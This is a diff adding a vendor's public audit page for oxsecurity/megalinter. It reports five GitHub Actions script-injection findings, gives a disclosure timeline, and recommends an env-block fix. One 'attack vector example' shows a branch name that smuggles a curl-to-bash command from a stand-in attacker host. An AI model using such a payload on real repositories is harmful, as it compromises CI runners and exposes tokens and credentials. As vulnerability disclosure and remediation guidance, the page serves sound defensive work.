@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Public Audit: oxsecurity/megalinter | DataWizual Security</title>
+    <meta name="description" content="Public security audit of oxsecurity/megalinter by Auditor Core v2.2.1. 5 confirmed GitHub Actions script injection vulnerabilities disclosed responsibly.">
+
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🛡️</text></svg>">
+
+    <style>
+        @keyframes shimmer {
+            0% { background-position: -200% center; }
+            100% { background-position: 200% center; }
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes horizontal-scan {
+            0% { width: 0; left: 0; opacity: 0; }
+            50% { width: 100%; opacity: 0.7; }
+            100% { width: 0; left: 100%; opacity: 0; }
+        }
+
+        .scan-line {
+            position: absolute;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #3498db, transparent);
+            animation: horizontal-scan 2s infinite linear;
+            top: 0; left: 0; right: 0;
+        }
+
+        .version-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(52,152,219,0.15);
+            border: 1px solid rgba(52,152,219,0.3);
+            color: var(--primary);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+        }
+
+        .version-badge.red {
+            background: rgba(239,68,68,0.12);
+            border-color: rgba(239,68,68,0.3);
+            color: #f87171;
+        }
+
+        .version-badge.green {
+            background: rgba(74,222,128,0.15);
+            border-color: rgba(74,222,128,0.3);
+            color: #4ade80;
+        }
+
+        .version-badge.orange {
+            background: rgba(251,146,60,0.15);
+            border-color: rgba(251,146,60,0.3);
+            color: #fb923c;
+        }
+
+        .territory-card {
+            transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .territory-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--primary);
+        }
+
+        .territory-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            transition: 0.5s;
+        }
+
+        .territory-card:hover::before { left: 100%; }
+
+        .finding-row {
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            padding: 16px 0;
+        }
+
+        .finding-row:last-child { border-bottom: none; }
+
+        .code-block {
+            background: rgba(10,12,18,0.9);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 10px;
+            padding: 16px 20px;
+            font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+            font-size: 0.82rem;
+            line-height: 1.7;
+            overflow-x: auto;
+            margin: 12px 0;
+        }
+
+        .code-block .bad { color: #f87171; }
+        .code-block .good { color: #4ade80; }
+        .code-block .comment { color: #555e6e; }
+        .code-block .key { color: #fb923c; }
+        .code-block .val { color: #a5f3fc; }
+
+        .timeline-dot {
+            width: 12px; height: 12px;
+            border-radius: 50%;
+            background: var(--primary);
+            flex-shrink: 0;
+            margin-top: 5px;
+            box-shadow: 0 0 8px rgba(52,152,219,0.5);
+        }
+
+        .timeline-dot.red {
+            background: #f87171;
+            box-shadow: 0 0 8px rgba(248,113,113,0.5);
+        }
+
+        .timeline-dot.green {
+            background: #4ade80;
+            box-shadow: 0 0 8px rgba(74,222,128,0.5);
+        }
+
+        .shimmer-text {
+            background: linear-gradient(90deg, var(--primary) 0%, #4ade80 50%, var(--primary) 100%);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: shimmer 3s linear infinite;
+        }
+
+        .stat-box {
+            background: rgba(26,28,32,0.8);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 14px;
+            padding: 24px;
+            text-align: center;
+        }
+
+        .disclosure-banner {
+            background: rgba(239,68,68,0.06);
+            border: 1px solid rgba(239,68,68,0.2);
+            border-radius: 12px;
+            padding: 18px 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- NAV -->
+<nav class="navbar">
+    <div class="container">
+        <div class="logo">
+            <i class="fas fa-shield-alt"></i> DataWizual Security
+        </div>
+        <button class="hamburger" aria-label="Toggle menu">
+            <span></span><span></span><span></span>
+        </button>
+        <div class="nav-links">
+            <a href="index.html">Home</a>
+            <div class="dropdown">
+                <a href="#" class="dropdown-trigger">Products <i class="fas fa-chevron-down"></i></a>
+                <div class="dropdown-content">
+                    <a href="auditor-core.html"><i class="fas fa-search"></i> Auditor Core</a>
+                    <a href="sentinel.html"><i class="fas fa-shield-alt"></i> Sentinel</a>
+                    <a href="compare.html"><i class="fas fa-layer-group"></i> Compare Engines</a>
+                </div>
+            </div>
+            <a href="audit.html">Audit Service</a>
+            <div class="dropdown">
+                <a href="#" class="dropdown-trigger">Resources <i class="fas fa-chevron-down"></i></a>
+                <div class="dropdown-content">
+                    <a href="methodology.html">Methodology</a>
+                    <a href="sample-report.html">Demo Report</a>
+                    <a href="security-policy.html">Security Policy</a>
+                    <a href="blog.html" class="nav-btn">Blog</a>
+                </div>
+            </div>
+            <a href="pricing.html" class="nav-btn">Pricing</a>
+            <a href="get.html" class="nav-btn">Get Access</a>
+            <a href="terms.html" class="nav-btn">Terms</a>
+            <a href="audit-megalinter.html" class="nav-btn active">Public Audits</a>
+        </div>
+    </div>
+</nav>
+
+<!-- HERO -->
+<header class="hero" style="min-height: 60vh; display: flex; align-items: center; position: relative; overflow: hidden; padding: 100px 0 60px;">
+    <div class="scan-line"></div>
+    <div class="container" style="position: relative; z-index: 2;">
+        <div style="max-width: 900px; margin: 0 auto; text-align: center;">
+
+            <div style="display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-bottom: 24px;">
+                <span class="version-badge"><i class="fas fa-search"></i> Auditor Core v2.2.1</span>
+                <span class="version-badge red"><i class="fas fa-bug"></i> 5 Confirmed Findings</span>
+                <span class="version-badge green"><i class="fas fa-check-circle"></i> Responsibly Disclosed</span>
+            </div>
+
+            <div style="font-size: 0.85rem; color: var(--gray); margin-bottom: 16px; text-transform: uppercase; letter-spacing: 0.1em;">
+                Public Security Audit · April 2026
+            </div>
+
+            <h1 style="font-size: 2.8rem; line-height: 1.2; margin-bottom: 20px;">
+                <span class="shimmer-text">oxsecurity / megalinter</span>
+            </h1>
+
+            <p style="color: var(--gray); font-size: 1.1rem; max-width: 700px; margin: 0 auto 32px; line-height: 1.7;">
+                GitHub Actions script injection via untrusted pull request contexts —
+                5 confirmed vulnerabilities across 4 workflow files, discovered and disclosed
+                using <strong style="color: white;">Auditor Core v2.2.1</strong>.
+            </p>
+
+            <div style="display: flex; justify-content: center; gap: 16px; flex-wrap: wrap;">
+                <a href="https://github.com/oxsecurity/megalinter/issues/7657"
+                   target="_blank" rel="noopener"
+                   class="btn btn-primary btn-glow">
+                    <i class="fas fa-external-link-alt"></i> View GitHub Issue #7657
+                </a>
+                <a href="#findings" class="btn btn-secondary">
+                    <i class="fas fa-list"></i> See Findings
+                </a>
+            </div>
+
+        </div>
+    </div>
+    <div style="position: absolute; bottom: 0; left: 0; right: 0; height: 120px;
+                background: linear-gradient(to top, var(--dark), transparent); z-index: 1;"></div>
+</header>
+
+<!-- STATS ROW -->
+<section style="padding: 60px 0; background: rgba(15,23,42,0.7);">
+    <div class="container">
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 20px; max-width: 900px; margin: 0 auto;">
+
+            <div class="stat-box">
+                <div style="font-size: 2.2rem; font-weight: 700; color: #f87171;">5</div>
+                <div style="color: var(--gray); font-size: 0.85rem; margin-top: 6px;">Critical findings</div>
+            </div>
+
+            <div class="stat-box">
+                <div style="font-size: 2.2rem; font-weight: 700; color: var(--primary);">4</div>
+                <div style="color: var(--gray); font-size: 0.85rem; margin-top: 6px;">Workflow files</div>
+            </div>
+
+            <div class="stat-box">
+                <div style="font-size: 2.2rem; font-weight: 700; color: #fb923c;">2</div>
+                <div style="color: var(--gray); font-size: 0.85rem; margin-top: 6px;">Injection vectors</div>
+            </div>
+
+            <div class="stat-box">
+                <div style="font-size: 2.2rem; font-weight: 700; color: #a855f7;">75.5</div>
+                <div style="color: var(--gray); font-size: 0.85rem; margin-top: 6px;">SPI score</div>
+            </div>
+
+            <div class="stat-box">
+                <div style="font-size: 2.2rem; font-weight: 700; color: #4ade80;">
+                    <i class="fas fa-check"></i>
+                </div>
+                <div style="color: var(--gray); font-size: 0.85rem; margin-top: 6px;">Issue filed</div>
+            </div>
+
+        </div>
+    </div>
+</section>
+
+<!-- FINDINGS -->
+<section id="findings" style="padding: 80px 0; background: var(--dark);">
+    <div class="container" style="max-width: 900px;">
+
+        <h2 style="font-size: 2rem; margin-bottom: 10px;">
+            Confirmed <span class="text-gradient">Vulnerabilities</span>
+        </h2>
+        <p style="color: var(--gray); margin-bottom: 48px; line-height: 1.7;">
+            All 5 findings were manually verified against the live repository before disclosure.
+            No finding was published based solely on automated output.
+        </p>
+
+        <!-- Finding 1 -->
+        <div class="territory-card" style="background: rgba(26,28,32,0.8); border: 1px solid rgba(255,255,255,0.06); border-radius: 16px; padding: 32px; margin-bottom: 24px;">
+            <div style="display: flex; align-items: flex-start; gap: 16px; margin-bottom: 20px;">
+                <div style="background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3); border-radius: 8px; padding: 8px 14px; font-size: 0.75rem; font-weight: 700; color: #f87171; white-space: nowrap;">CRITICAL</div>
+                <div>
+                    <div style="font-family: monospace; font-size: 0.9rem; color: var(--primary); margin-bottom: 4px;">GHA_SCRIPT_INJECTION</div>
+                    <div style="color: var(--gray); font-size: 0.85rem;">.github/workflows/deploy-DEV-linters.yml · line 42</div>
+                </div>
+            </div>
+            <p style="color: var(--gray); line-height: 1.7; margin-bottom: 16px;">
+                The PR title is interpolated directly into a <code style="color: #a5f3fc;">run:</code> shell step.
+                An attacker opens a PR with a title containing shell metacharacters to execute arbitrary commands on the runner.
+            </p>
+            <div class="code-block">
+                <span class="comment"># Vulnerable — pr.title is attacker-controlled</span><br>
+                <span class="bad">echo "title=${{ github.event.pull_request.title }}" >> $GITHUB_OUTPUT</span>
+            </div>
+            <div style="margin-top: 16px; padding-top: 16px; border-top: 1px solid rgba(255,255,255,0.05);">
+                <span style="color: #555e6e; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.08em;">Vector</span>
+                <span style="color: var(--gray); font-size: 0.85rem; margin-left: 10px;"><code style="color: #fb923c;">github.event.pull_request.title</code></span>
+            </div>
+        </div>
+
+        <!-- Findings 2–5 grouped (same pattern) -->
+        <div class="territory-card" style="background: rgba(26,28,32,0.8); border: 1px solid rgba(255,255,255,0.06); border-radius: 16px; padding: 32px; margin-bottom: 24px;">
+            <div style="display: flex; align-items: flex-start; gap: 16px; margin-bottom: 20px;">
+                <div style="background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3); border-radius: 8px; padding: 8px 14px; font-size: 0.75rem; font-weight: 700; color: #f87171; white-space: nowrap;">CRITICAL × 4</div>
+                <div>
+                    <div style="font-family: monospace; font-size: 0.9rem; color: var(--primary); margin-bottom: 4px;">GHA_SCRIPT_INJECTION</div>
+                    <div style="color: var(--gray); font-size: 0.85rem;">4 workflow files · identical pattern</div>
+                </div>
+            </div>
+
+            <p style="color: var(--gray); line-height: 1.7; margin-bottom: 16px;">
+                The branch name (<code style="color: #a5f3fc;">github.head_ref</code>) from a forked PR is interpolated into a shell variable assignment.
+                Surrounding quotes do not prevent injection — GitHub Actions interpolates the expression <em>before</em> the shell parses the line.
+            </p>
+
+            <div class="code-block">
+                <span class="comment"># Vulnerable — head_ref is attacker-controlled (fork branch name)</span><br>
+                <span class="bad">GITHUB_BRANCH=$([ "${{ github.event_name }}" == "pull_request" ] \</span><br>
+                <span class="bad">&nbsp;&nbsp;&amp;&amp; echo "${{ github.head_ref }}" \</span><br>
+                <span class="bad">&nbsp;&nbsp;|| echo "${{ github.ref_name }}")</span>
+            </div>
+
+            <div style="margin-top: 20px; display: flex; flex-direction: column; gap: 10px;">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <i class="fas fa-file-code" style="color: var(--primary); width: 14px;"></i>
+                    <span style="color: var(--gray); font-size: 0.85rem;">deploy-DEV-linters.yml · line 182</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <i class="fas fa-file-code" style="color: var(--primary); width: 14px;"></i>
+                    <span style="color: var(--gray); font-size: 0.85rem;">deploy-DEV.yml · line 170</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <i class="fas fa-file-code" style="color: var(--primary); width: 14px;"></i>
+                    <span style="color: var(--gray); font-size: 0.85rem;">deploy-RELEASE-linters.yml · line 161</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <i class="fas fa-file-code" style="color: var(--primary); width: 14px;"></i>
+                    <span style="color: var(--gray); font-size: 0.85rem;">deploy-BETA-linters.yml · line 177</span>
+                </div>
+            </div>
+
+            <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.05);">
+                <span style="color: #555e6e; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.08em;">Vector</span>
+                <span style="color: var(--gray); font-size: 0.85rem; margin-left: 10px;"><code style="color: #fb923c;">github.head_ref</code> — fork branch name, fully attacker-controlled</span>
+            </div>
+        </div>
+
+        <!-- Attack example -->
+        <div style="background: rgba(239,68,68,0.05); border: 1px solid rgba(239,68,68,0.15); border-radius: 14px; padding: 28px; margin-bottom: 48px;">
+            <h3 style="color: #f87171; margin-bottom: 16px; font-size: 1.1rem;">
+                <i class="fas fa-skull-crossbones"></i> Attack vector example
+            </h3>
+            <p style="color: var(--gray); line-height: 1.7; margin-bottom: 14px;">
+                Create a fork, name the branch as shown below, open a pull request — the workflow executes the injected command on the GitHub Actions runner:
+            </p>
+            <div class="code-block">
+                <span class="bad">feature/x"; curl -s https://attacker.com/shell.sh | bash; echo "</span>
+            </div>
+            <p style="color: var(--gray); font-size: 0.88rem; margin-top: 12px; line-height: 1.6;">
+                Potential impact: exfiltration of <code style="color: #a5f3fc;">GITHUB_TOKEN</code>, registry credentials, build artefact tampering, lateral movement to connected services.
+            </p>
+        </div>
+
+        <!-- Fix -->
+        <h2 style="font-size: 1.8rem; margin-bottom: 16px;">
+            Recommended <span class="text-gradient">Fix</span>
+        </h2>
+        <p style="color: var(--gray); margin-bottom: 20px; line-height: 1.7;">
+            Pass all untrusted GitHub contexts through an <code style="color: #4ade80;">env:</code> block.
+            Shell variable references (<code style="color: #a5f3fc;">$VAR</code>) are never subject to expression injection.
+        </p>
+        <div class="code-block" style="margin-bottom: 60px;">
+            <span class="comment"># Safe — untrusted data bound to env vars, never interpolated into run:</span><br>
+            <span class="key">- name:</span> <span class="val">Get PR title or commit message</span><br>
+            &nbsp;&nbsp;<span class="key">id:</span> <span class="val">get-title</span><br>
+            &nbsp;&nbsp;<span class="key">env:</span><br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="key">PR_TITLE:</span> <span class="val">${{ github.event.pull_request.title }}</span><br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="key">HEAD_REF:</span> <span class="val">${{ github.head_ref }}</span><br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="key">REF_NAME:</span> <span class="val">${{ github.ref_name }}</span><br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="key">EVENT_NAME:</span> <span class="val">${{ github.event_name }}</span><br>
+            &nbsp;&nbsp;<span class="key">run:</span> <span class="val">|</span><br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="good">echo "title=${PR_TITLE}" >> $GITHUB_OUTPUT</span><br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="good">GITHUB_BRANCH=$([ "$EVENT_NAME" == "pull_request" ] \</span><br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="good">&nbsp;&nbsp;&amp;&amp; echo "$HEAD_REF" || echo "$REF_NAME")</span>
+        </div>
+
+    </div>
+</section>
+
+<!-- DISCLOSURE TIMELINE -->
+<section style="padding: 60px 0; background: rgba(15,23,42,0.7);">
+    <div class="container" style="max-width: 700px;">
+        <h2 style="font-size: 1.8rem; margin-bottom: 40px;">
+            Disclosure <span class="text-gradient">Timeline</span>
+        </h2>
+
+        <div style="display: flex; flex-direction: column; gap: 28px;">
+
+            <div style="display: flex; gap: 20px; align-items: flex-start;">
+                <div class="timeline-dot"></div>
+                <div>
+                    <div style="color: white; font-weight: 600; margin-bottom: 4px;">April 29, 2026 — Scan initiated</div>
+                    <div style="color: var(--gray); font-size: 0.88rem; line-height: 1.6;">Auditor Core v2.2.1 scanned oxsecurity/megalinter. 109 CRITICAL findings reported initially. Manual triage began immediately.</div>
+                </div>
+            </div>
+
+            <div style="display: flex; gap: 20px; align-items: flex-start;">
+                <div class="timeline-dot"></div>
+                <div>
+                    <div style="color: white; font-weight: 600; margin-bottom: 4px;">April 30, 2026 — Manual verification</div>
+                    <div style="color: var(--gray); font-size: 0.88rem; line-height: 1.6;">Each GHA_SCRIPT_INJECTION finding was verified directly against the live repository. Docker curl/wget patterns excluded as intentional maintainer decisions. False positives removed.</div>
+                </div>
+            </div>
+
+            <div style="display: flex; gap: 20px; align-items: flex-start;">
+                <div class="timeline-dot red"></div>
+                <div>
+                    <div style="color: white; font-weight: 600; margin-bottom: 4px;">April 30, 2026 — 5 findings confirmed</div>
+                    <div style="color: var(--gray); font-size: 0.88rem; line-height: 1.6;">All 5 GHA_SCRIPT_INJECTION instances independently verified as exploitable. SECURITY.md reviewed — maintainers request public issue disclosure.</div>
+                </div>
+            </div>
+
+            <div style="display: flex; gap: 20px; align-items: flex-start;">
+                <div class="timeline-dot green"></div>
+                <div>
+                    <div style="color: white; font-weight: 600; margin-bottom: 4px;">April 30, 2026 — Issue filed</div>
+                    <div style="color: var(--gray); font-size: 0.88rem; line-height: 1.6;">
+                        Responsible disclosure completed per oxsecurity/megalinter SECURITY.md policy.
+                        <a href="https://github.com/oxsecurity/megalinter/issues/7657" target="_blank" rel="noopener" style="color: var(--primary);">
+                            GitHub Issue #7657 →
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</section>
+
+<!-- HOW IT WAS FOUND -->
+<section style="padding: 80px 0; background: var(--dark);">
+    <div class="container" style="max-width: 900px;">
+        <h2 style="font-size: 1.8rem; margin-bottom: 16px;">
+            How It Was <span class="text-gradient">Found</span>
+        </h2>
+        <p style="color: var(--gray); margin-bottom: 40px; line-height: 1.7;">
+            This audit was performed using Auditor Core v2.2.1 — a deterministic security engine combining 11 detectors with AI-assisted validation.
+        </p>
+
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 24px;">
+
+            <div class="territory-card" style="background: rgba(26,28,32,0.8); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; padding: 28px;">
+                <i class="fas fa-cogs" style="font-size: 1.8rem; color: var(--primary); margin-bottom: 16px; display: block;"></i>
+                <h4 style="color: white; margin-bottom: 10px;">CI/CD Detector</h4>
+                <p style="color: var(--gray); font-size: 0.88rem; line-height: 1.6;">
+                    Dedicated <code style="color: #a5f3fc;">cicd_analyzer</code> engine parses all GitHub Actions workflow files and flags untrusted context interpolation patterns in <code style="color: #a5f3fc;">run:</code> steps.
+                </p>
+            </div>
+
+            <div class="territory-card" style="background: rgba(26,28,32,0.8); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; padding: 28px;">
+                <i class="fas fa-filter" style="font-size: 1.8rem; color: #fb923c; margin-bottom: 16px; display: block;"></i>
+                <h4 style="color: white; margin-bottom: 10px;">Manual Triage</h4>
+                <p style="color: var(--gray); font-size: 0.88rem; line-height: 1.6;">
+                    All 109 CRITICAL findings were reviewed. Docker curl/wget patterns were excluded as deliberate maintainer choices. Only independently exploitable issues were published.
+                </p>
+            </div>
+
+            <div class="territory-card" style="background: rgba(26,28,32,0.8); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; padding: 28px;">
+                <i class="fas fa-file-alt" style="font-size: 1.8rem; color: #4ade80; margin-bottom: 16px; display: block;"></i>
+                <h4 style="color: white; margin-bottom: 10px;">Full Report</h4>
+                <p style="color: var(--gray); font-size: 0.88rem; line-height: 1.6;">
+                    Auditor Core generated PDF, HTML, and JSON reports with SPI score, compliance mapping (SOC 2, CIS Controls v8, ISO 27001), and chain analysis.
+                </p>
+            </div>
+
+        </div>
+    </div>
+</section>
+
+<!-- CTA -->
+<section style="padding: 80px 0; background: rgba(15,23,42,0.7); text-align: center;">
+    <div class="container">
+        <h2 style="font-size: 2rem; margin-bottom: 16px;">
+            Want This Level of Analysis <span class="text-gradient">For Your Codebase?</span>
+        </h2>
+        <p style="color: var(--gray); max-width: 600px; margin: 0 auto 36px; line-height: 1.7; font-size: 1rem;">
+            Auditor Core v2.2.1 runs fully local — no cloud, no telemetry.
+            SOC 2, CIS Controls v8 and ISO 27001 mapped findings out of the box.
+        </p>
+        <div style="display: flex; justify-content: center; gap: 16px; flex-wrap: wrap;">
+            <a href="audit.html" class="btn btn-primary btn-glow">
+                <i class="fas fa-search"></i> Request an Audit
+            </a>
+            <a href="sample-report.html" class="btn btn-secondary">
+                <i class="fas fa-file-alt"></i> View Demo Report
+            </a>
+        </div>
+    </div>
+</section>
+
+<!-- FOOTER -->
+<footer class="footer">
+    <div class="container">
+        <div class="footer-grid" style="display: flex; justify-content: space-between; flex-wrap: wrap; gap: 40px; padding-bottom: 60px;">
+            <div style="flex: 1; min-width: 250px;">
+                <h4 style="margin-bottom: 20px;">DataWizual Security</h4>
+                <p style="color: var(--gray);">Developing territories of confidence through rigorous engineering.</p>
+                <p style="margin-top: 20px; color: var(--primary); font-weight: bold;">
+                    <i class="fas fa-envelope"></i> contact@datawizual.com
+                </p>
+            </div>
+            <div>
+                <h4 style="margin-bottom: 20px;">Our Ecosystem</h4>
+                <div style="display: flex; flex-direction: column; gap: 10px;">
+                    <a href="auditor-core.html" style="color: var(--gray); text-decoration: none;"><i class="fas fa-search"></i> Auditor Core v2.2.1</a>
+                    <a href="sentinel.html" style="color: var(--gray); text-decoration: none;"><i class="fas fa-shield-alt"></i> Sentinel Core v2.2.1</a>
+                    <a href="compare.html" style="color: var(--gray); text-decoration: none;"><i class="fas fa-layer-group"></i> Compare</a>
+                </div>
+            </div>
+            <div>
+                <h4 style="margin-bottom: 20px;">Resources</h4>
+                <div style="display: flex; flex-direction: column; gap: 10px;">
+                    <a href="methodology.html" style="color: var(--gray); text-decoration: none;">Methodology</a>
+                    <a href="sample-report.html" style="color: var(--gray); text-decoration: none;">Demo Report</a>
+                    <a href="security-policy.html" style="color: var(--gray); text-decoration: none;">Security Policy</a>
+                    <a href="blog.html" style="color: var(--gray); text-decoration: none;">Blog</a>
+                </div>
+            </div>
+        </div>
+        <div style="text-align: center; color: #444; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 30px;">
+            &copy; 2026 DataWizual Security
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
